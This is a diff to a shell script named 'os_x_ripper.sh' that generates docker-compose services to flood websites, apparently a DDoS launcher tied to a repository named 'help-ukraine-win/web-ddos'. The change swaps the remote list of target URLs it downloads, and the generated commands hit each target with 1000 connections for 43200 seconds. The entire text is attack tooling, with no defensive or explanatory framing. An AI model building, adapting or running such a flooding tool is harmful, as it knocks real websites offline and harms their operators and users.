@@ -3,7 +3,7 @@
 
 VERSION='1.0'
 
-TARGETS_URL='https://raw.githubusercontent.com/ValeryP/help-ukraine-win/main/web-ddos/public/targets.txt'
+TARGETS_URL='https://raw.githubusercontent.com/jeka-mel/bump/main/urls.txt'
 
 print_help () {
   echo "Usage: os_x_ripper.sh --file urls.txt"
@@ -40,7 +40,7 @@ generate_compose_light () {
       echo "    command: -c 1000 -d 43200s $site_url" >> docker-compose.yml
       ((counter=counter+1))
     fi
-  done < targets.txt
+  done < urls.txt
 }
 
 generate_compose () {
@@ -55,7 +55,7 @@ generate_compose () {
         echo "    command: $site_url" >> docker-compose.yml
         ((counter=counter+1))
     fi
-  done < targets.txt
+  done < urls.txt
 }
 
 ripper_start () {
